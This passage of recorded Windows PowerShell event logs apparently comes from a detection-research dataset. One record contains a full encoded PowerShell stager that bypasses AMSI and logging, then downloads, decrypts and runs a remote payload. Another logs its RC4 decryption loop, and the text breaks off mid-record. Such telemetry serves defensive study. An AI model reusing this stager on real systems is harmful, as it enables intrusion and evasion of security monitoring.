{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:28:40","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":5972,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0000-436D-2D856290D601}","UserID":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":5092,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-22 04:28:40","@timestamp":"2020-09-22T08:28:40.533Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"pgustavo","RecordNumber":214349,"Payload":"CommandInvocation(Get-Random): \"Get-Random\"\r\n","Task":106,"Domain":"THESHIRE","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 4c21984a-34d8-4d8e-8cf3-8ec0ea4212e8\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 14fec114-9ecd-42a9-9fe7-148387e88b78\r\n        Pipeline ID = 1\r\n        Command Name = Get-Random\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 29320\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:28:41","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":5972,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0000-456D-2D856290D601}","UserID":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":5092,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-22 04:28:40","@timestamp":"2020-09-22T08:28:41.534Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"pgustavo","RecordNumber":214350,"Payload":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\r\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"\n                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;\n                $S[$_], $S[$J] = $S[$J], $S[$_];\n            \"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"0\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"1\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"2\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"3\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"4\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"5\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"6\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"7\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"8\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"9\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"10\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"11\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"12\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"13\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"14\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"15\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"16\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"17\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"18\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"19\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"20\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"21\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"22\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"23\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"24\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"25\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"26\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"27\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"28\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"29\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"30\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"31\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"32\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"33\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"34\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"35\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"36\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"37\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"38\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"39\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"40\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"41\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"42\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"43\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"44\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"45\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"46\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"47\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"48\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"49\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"50\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"51\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"52\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"53\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"54\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"55\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"56\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"57\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"58\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"59\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"60\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"61\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"62\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"63\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"64\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"65\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"66\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"67\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"68\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"69\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"70\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"71\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"72\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"73\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"74\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"75\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"76\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"77\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"78\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"79\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"80\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"81\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"82\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"83\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"84\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"85\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"86\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"87\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"88\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"89\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"90\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"91\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"92\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"93\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"94\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"95\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"96\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"97\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"98\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"99\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"100\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"101\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"102\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"103\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"104\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"105\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"106\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"107\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"108\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"109\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"110\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"111\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"112\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"113\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"114\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"115\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"116\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"117\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"118\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"119\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"120\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"121\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"122\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"123\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"124\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"125\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"126\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"127\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"128\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"129\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"130\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"131\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"132\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"133\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"134\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"135\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"136\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"137\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"138\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"139\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"140\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"141\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"142\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"143\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"144\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"145\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"146\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"147\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"148\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"149\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"150\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"151\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"152\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"153\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"154\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"155\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"156\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"157\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"158\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"159\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"160\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"161\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"162\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"163\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"164\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"165\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"166\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"167\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"168\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"169\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"170\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"171\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"172\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"173\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"174\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"175\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"176\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"177\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"178\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"179\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"180\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"181\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"182\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"183\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"184\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"185\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"186\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"187\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"188\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"189\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"190\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"191\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"192\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"193\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"194\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"195\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"196\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"197\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"198\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"199\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"200\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"201\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"202\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"203\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"204\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"205\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"206\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"207\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"208\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"209\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"210\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"211\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"212\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"213\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"214\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"215\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"216\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"217\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"218\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"219\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"220\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"221\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"222\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"223\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"224\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"225\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"226\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"227\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"228\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"229\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"230\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"231\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"232\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"233\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"234\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"235\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"236\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"237\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"238\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"239\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"240\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; 